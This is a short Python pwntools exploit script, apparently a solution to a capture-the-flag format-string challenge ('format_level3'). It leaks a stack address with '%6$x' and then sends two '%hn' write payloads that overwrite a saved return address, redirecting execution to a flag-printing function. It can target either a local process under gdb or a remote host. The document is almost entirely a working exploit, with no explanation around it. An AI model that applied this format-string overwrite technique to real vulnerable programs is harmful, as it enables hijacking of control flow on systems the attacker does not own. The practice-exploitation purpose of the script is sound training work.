from pwn import * 

context(arch='i386',os = 'linux', log_level='DEBUG')
debug = 1
gdb_is = 1
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./format_level3")
    
else:
    host = "172.20.10.8:28480"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./format_level2",'b talk')
    gdb.attach(r,'b *0x804969e')
    # gdb.attach(r)
    pause()
    pass


# ----------------------手动测
r.sendlineafter(b'choice: \n',b'3')
r.sendafter(b'talk: \n',b'%6$x')
r.recvuntil(b'said: \n')
num = int(r.recvuntil(b'But')[:-3].decode(),16)
# 0xffcf8dbc ret
# 0xffcf8d9c str in stack
# distance -0x20
flag_addr = 0x8049317
ret_addr_ptr = 0x804974a
ret_addr = num - 0x1c & 0xFFFF
info(hex(ret_addr))


payload = f'%{ret_addr}c%6$hn'.encode()
info(size(payload))
r.sendlineafter(b'choice: \n',b'3')
r.sendafter(b'talk: \n',payload)

payload = f'%{flag_addr&0xFFFF}c%14$hn'.encode()
info(size(payload))
r.sendlineafter(b'choice: \n',b'3')
r.sendafter(b'talk: \n',payload)

r.interactive()

